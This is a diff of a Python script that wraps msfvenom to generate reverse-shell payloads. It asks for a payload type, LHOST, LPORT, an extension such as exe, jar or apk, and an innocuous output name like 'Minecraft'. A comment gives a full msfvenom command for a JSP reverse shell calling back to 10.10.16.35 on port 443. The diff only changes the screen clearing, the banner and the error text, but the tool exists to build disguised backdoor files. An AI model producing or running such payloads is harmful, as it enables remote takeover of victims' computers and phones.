@@ -1,5 +1,5 @@
 #! /usr/bin/python3
-import os
+import os, platform
 W = '\033[37m'
 R = '\033[1;31m'  # red
 G = '\033[1;32m'  # green
@@ -8,35 +8,35 @@ B = '\033[1;34m'  # blue
 P = '\033[1;35m'  # purple
 C = '\033[1;36m'  # cyan
 GRs = '\033[1;37m'  # gray
+sh = os.system
 #msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.35 LPORT=443 -f war -o reverse.war
 def banner():
-	print(O+"""
-
-
- ___ __ __   ______   ______     ________   __  __   _________  ______      
-/__//_//_/\ /_____/\ /_____/\   /_______/\ /_/\/_/\ /________/\/_____/\     
-\::\| \| \ \\::::_\/_\::::_\/_  \::: _  \ \\:\ \:\ \\__.::.__\/\:::_ \ \    
- \:.      \ \\:\/___/\\:\/___/\  \::(_)  \ \\:\ \:\ \  \::\ \   \:\ \ \ \   
-  \:.\-/\  \ \\_::._\:\\:::._\/   \:: __  \ \\:\ \:\ \  \::\ \   \:\ \ \ \  
-   \. \  \  \ \ /____\:\\:\ \      \:.\ \  \ \\:\_\:\ \  \::\ \   \:\_\ \ \ 
-    \__\/ \__\/ \_____\/ \_\/       \__\/\__\/ \_____\/   \__\/    \_____\/ By Mrx04Programmer
+    if "indow" in platform.platform():
+        sh("cls")
+    else:
+        sh("clear")
+    
+    print(f"""{O}\n
+┌┬┐┌─┐┌─┐  ┌─┐┬ ┬┌┬┐┌─┐
+│││└─┐├┤   ├─┤│ │ │ │ │
+┴ ┴└─┘└    ┴ ┴└─┘ ┴ └─┘ {R}By Mrx04Programmer{W}
 """)
-os.system("clear")
+
 banner()
 payload = input(f"{C}Payload: {W}")
 host = input(f"{C}LHOST: {W}")
 port = input(f"{C}LPORT: {W}")
 ex = input(f"{B}Extension (ej: exe,jar,apk, etc): {W}")
 output = input(f"{G}OUTPUT(ex: Minecraft):{W}")
-os.system("clear")
 banner()
+print(f"{G}+ {W}generating ...")
 if ex == "apk":
-	command = os.system("msfvenom -p "+payload+" LHOST="+host+" LPORT="+port+" R > "+output+"."+ex)
+	command = sh("msfvenom -p "+payload+" LHOST="+host+" LPORT="+port+" R > "+output+"."+ex)
 elif "apk" in ex:
-	command = os.system("msfvenom -p "+payload+" LHOST="+host+" LPORT="+port+" R > "+output+"."+ex)
+	command = sh("msfvenom -p "+payload+" LHOST="+host+" LPORT="+port+" R > "+output+"."+ex)
 else:
-	command = os.system("msfvenom -p "+payload+" LHOST="+host+" LPORT="+port+" -f "+ex+" -o "+output+"."+ex)
+	command = sh("msfvenom -p "+payload+" LHOST="+host+" LPORT="+port+" -f "+ex+" -o "+output+"."+ex)
 if command == 32512:
-	print(f"{R}[-] Error.")
+	print(f"{R}[-] Error, revisa los datos ingresados por favor")
 if command == 0:
 	print(f"{G}[INFO]{W} File Created: {P}{output}{ex}")
